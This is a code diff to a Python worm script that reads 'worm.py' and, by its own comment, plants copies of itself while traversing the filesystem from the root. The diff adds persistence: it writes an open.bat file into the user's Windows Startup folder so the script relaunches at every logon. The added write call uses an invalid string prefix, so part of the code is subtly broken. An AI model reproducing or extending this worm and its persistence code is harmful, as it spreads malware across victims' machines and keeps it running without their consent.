@@ -1,4 +1,4 @@
-from os import chdir, scandir, getcwd
+from os import chdir, scandir, getcwd, environ, path as ospath
 import UAC
 
 # IF UAC is not given, run.py will not be executed
@@ -14,6 +14,14 @@ with open("worm.py", "rb") as infile:
         break
     WORM_BIN += info
 
+USER_NAME = environ["USERNAME"]
+target_path = ospath.realpath(__file__)
+bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+
+with open(bat_path + '\\' + "open.bat", "w") as bat_file:
+    bat_file.write(d'start "" {target_path}')
+
+    
 chdir('/')
 def traverse(path):
     # plant worm1.py in the absolute path currently on
